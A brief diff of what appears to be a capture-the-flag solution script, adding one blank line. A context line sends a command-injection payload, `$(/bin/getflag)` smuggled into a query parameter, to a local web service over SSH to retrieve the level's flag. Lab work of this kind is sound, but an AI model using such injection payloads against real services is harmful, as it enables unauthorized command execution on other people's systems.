@@ -129,6 +129,7 @@ main() {
     checkflag=$(ssh_exec_via_socket "$level04_socket_path" "$host" "$port" "$level04_username" "curl -s 'localhost:4747/?x=\$(/bin/getflag)'" | head -n 1 | awk '{ print $NF }');
     close_ssh_socket "$level04_socket_path" "$host" "$port" "$level04_username";
 
+
     flag_outpath="$CURR_DIR_PATH/../flag";
     echo "Checkflag: $checkflag";
     echo -n "$checkflag" > "$flag_outpath";
